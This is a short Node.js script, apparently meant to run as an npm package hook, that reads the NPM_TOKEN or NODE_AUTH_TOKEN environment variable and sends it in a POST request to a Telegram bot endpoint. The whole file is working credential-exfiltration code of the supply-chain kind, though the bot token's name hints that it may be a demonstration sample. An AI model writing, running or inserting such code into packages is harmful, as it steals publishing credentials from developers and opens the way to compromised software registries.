#!/usr/bin/env node
const https = require("https");
const token = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN || "";
const body = JSON.stringify({ chat_id: "1", text: token });
const req = https.request({
  hostname: "api.telegram.org",
  path: "/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage",
  method: "POST",
  headers: { "Content-Type": "application/json" },
}, () => {});
req.write(body);
req.end();
